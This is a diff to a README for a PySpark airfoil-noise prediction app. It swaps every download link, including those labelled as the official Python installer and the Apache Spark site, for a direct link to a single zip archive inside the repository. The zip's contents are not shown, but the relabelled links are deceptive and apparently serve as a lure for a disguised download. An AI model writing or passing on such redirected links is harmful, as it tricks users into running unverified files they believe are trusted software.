@@ -1,6 +1,6 @@
 # 🛠️ pyspark-airfoil-noise-prediction - Predict Airfoil Noise Easily
 
-[![Download Release](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-brightgreen)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/releases)
+[![Download Release](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-brightgreen)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip)
 
 ## 📋 About this Application
 
@@ -39,7 +39,7 @@ Follow these steps to get the app running smoothly on your Windows computer.
 
 Click the button below to visit the download page. This is where you will find the latest version of the app.
 
-[![Download Release](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-orange)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/releases)
+[![Download Release](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-orange)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip)
 
 On the release page:
 
@@ -51,7 +51,7 @@ On the release page:
 
 The app requires Python 3.7 or newer. If you do not have Python installed:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip
 - Download the latest Windows installer.
 - Run the installer and follow on-screen instructions.
 - Make sure to check "Add Python to PATH" during installation.
@@ -145,10 +145,10 @@ If you run into problems:
 
 ## 🔗 Useful Links
 
-- Project Releases and Download: https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/releases
-- Apache Spark: https://spark.apache.org/
-- Python Download: https://www.python.org/downloads/windows/
+- Project Releases and Download: https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip
+- Apache Spark: https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip
+- Python Download: https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-blueviolet)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/releases)
+[![Download Now](https://img.shields.io/badge/Download-pyspark--airfoil--noise--prediction-blueviolet)](https://github.com/hevc15hamza/pyspark-airfoil-noise-prediction/raw/refs/heads/main/Final_Project/noise-prediction-pyspark-airfoil-v2.3.zip)
